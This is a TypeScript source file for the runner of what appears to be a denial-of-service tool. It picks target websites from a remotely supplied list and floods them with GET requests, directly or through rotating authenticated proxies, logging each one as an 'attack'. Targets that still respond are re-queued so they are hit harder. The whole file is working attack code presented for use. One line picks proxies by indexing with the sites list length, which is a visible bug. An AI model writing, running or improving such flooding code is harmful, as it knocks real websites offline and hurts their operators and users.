import { EventEmitter } from 'events'
import axios, { AxiosError } from 'axios-https-proxy-fix'
import { TargetData, ProxyData, SiteData, GetSitesAndProxiesResponse } from './types'
import { HttpHeadersUtils } from './utils/httpHeadersUtils'
import { Doser } from './doser'

export class Runner {
  private sites: SiteData[]
  private proxies: ProxyData[]
  private onlyProxy: boolean
  private readonly ATTACKS_PER_TARGET = 2
  private readonly ATTACKS_PER_PRIORITIZED_TARGET = 32
  private active = false
  public readonly eventSource: EventEmitter
  private requestTimeout: number = 5000
  private doserInstance: Doser

  constructor (props: { sites: SiteData[]; proxies: ProxyData[]; onlyProxy: boolean; doserInstance: Doser }) {
    this.sites = props.sites
    this.proxies = props.proxies
    this.onlyProxy = props.onlyProxy
    this.doserInstance = props.doserInstance
    this.eventSource = new EventEmitter()
  }

  async start () {
    this.active = true
    while (this.active) {
      try {
        let pTargets = this.doserInstance.getPrioritizedTargets()
        let pTarget = undefined
        if(pTargets.length > 0) {
          pTarget = pTargets[Math.floor(Math.random() * pTargets.length)]
          this.doserInstance.removePrioritizedTarget(pTarget.page, pTarget.proxyObj)
        }
        await this.sendTroops(pTarget)
      } catch (error) {
        this.active = false
        throw error
      }
    }
  }

  stop () {
    this.active = false
  }

  setProxyActive(newProxyValue: boolean) {
    this.onlyProxy = newProxyValue
  }

  updateConfiguration (config: GetSitesAndProxiesResponse) {
    this.sites = config.sites
    this.proxies = config.proxies
  }

  private async requestMe(target, timeout, proxyObj) {
    try {
      let response = undefined
      if(proxyObj) {
        response = await axios.get(target.site.page, {
          timeout: timeout,
          headers: HttpHeadersUtils.generateRequestHeaders(),
          proxy: proxyObj
        })

      } else {

        response = await axios.get(target.site.page, {
          timeout: timeout,
          headers: HttpHeadersUtils.generateRequestHeaders()
        })
      }
      return [response.status, undefined]

    } catch(err) {
      return [-1, err.code]
    }

  }

  private async sendTroops (prioritizedTarget) {
    if(prioritizedTarget){
      let target = prioritizedTarget.page
      let proxy = prioritizedTarget.proxyObj
      let okReq = 0
      for (let index = 0; index < this.ATTACKS_PER_PRIORITIZED_TARGET; index++) {
        const r = await this.requestMe(target, this.requestTimeout, proxy)
        if(r[0] != -1) {
          okReq = okReq + 1
        } 
        this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | PRIORITIZED | ${r[0] == -1 ? "" : r[0]} ${r[1]  ? r[1] : r[0] == -1 ? "Undefined error" : "OK"}` }) 
      }
      if(okReq >= (this.ATTACKS_PER_PRIORITIZED_TARGET / 8)) {
        this.doserInstance.addPrioritizedTarget(target, proxy)
        if(okReq >= (this.ATTACKS_PER_PRIORITIZED_TARGET / 4)) {
          this.doserInstance.addPrioritizedTarget(target, proxy)
        }
        if(okReq >= (this.ATTACKS_PER_PRIORITIZED_TARGET / 2)) {
          this.doserInstance.addPrioritizedTarget(target, proxy)
        }
      }
      return
    }
    const target = {
      site: this.sites[Math.floor(Math.random() * this.sites.length)],
      proxy: this.proxies
    } as TargetData
    
    
    
    let directRequest = false
    if (!this.onlyProxy) {
      let probe = await this.requestMe(target, this.requestTimeout, undefined)
      directRequest = probe[0] >= 200 && probe[0] != 407 && probe[0] < 510
      if(!directRequest) {
        console.debug("DIRECT probing err ", probe[1], "will use proxy")
        this.eventSource.emit('error', { error: directRequest })
      } else {
        this.doserInstance.addPrioritizedTarget(target, undefined)
        this.doserInstance.addPrioritizedTarget(target, undefined)
      }
    }

    let proxy = null

    for (let attackIndex = 0; (attackIndex < this.ATTACKS_PER_TARGET); attackIndex++) {
      if (!this.active) {
        break
      }
      
      try {
        if (directRequest) {
          if(this.onlyProxy) {
            console.log("Changing to only proxy")
            break
          }
          const r = await this.requestMe(target, this.requestTimeout, undefined)
          if(r[0] >=200) {
            this.doserInstance.addPrioritizedTarget(target, undefined)
            this.doserInstance.addPrioritizedTarget(target, undefined)
          }
          this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | DIRECT | ${r[0]} ${r[1] ? r[1] : "Undefined error"}` })
        } else {
          proxy = target.proxy[Math.floor(Math.random() * this.sites.length)]
          let proxyObj: any = {}
          const proxyAddressSplit = proxy.ip.split(':')
          const proxyIP = proxyAddressSplit[0]
          const proxyPort = parseInt(proxyAddressSplit[1])
          proxyObj.host = proxyIP
          proxyObj.port = proxyPort

          if(proxy.auth) {
            const proxyAuthSplit = proxy.auth.split(':')
            const proxyUsername = proxyAuthSplit[0]
            const proxyPassword = proxyAuthSplit[1]
            proxyObj.auth = { username: proxyUsername, password: proxyPassword }

          }

          const r = await this.requestMe(target, this.requestTimeout, proxyObj)
          if(r[0] >= 200) {
            this.doserInstance.addPrioritizedTarget(target, proxyObj)
            this.doserInstance.addPrioritizedTarget(target, proxyObj)
          }

          this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | PROXY | ${r[0] == -1 ? r[1] : r[0]}` })

          if (r[0] === 407) {
            console.log(proxy)
            proxy = null
          }
        }
      } catch (e) {
        proxy = null
        const code = (e as AxiosError).code || 'UNKNOWN'
        if (code === 'UNKNOWN') {
          console.error(e)
        }

        this.eventSource.emit('attack', { type: 'atack', url: target.site.page, log: `${target.site.page} | ${code}` })
        if (code === 'ECONNABORTED') {
          break
        }
      }
    }
  }
}
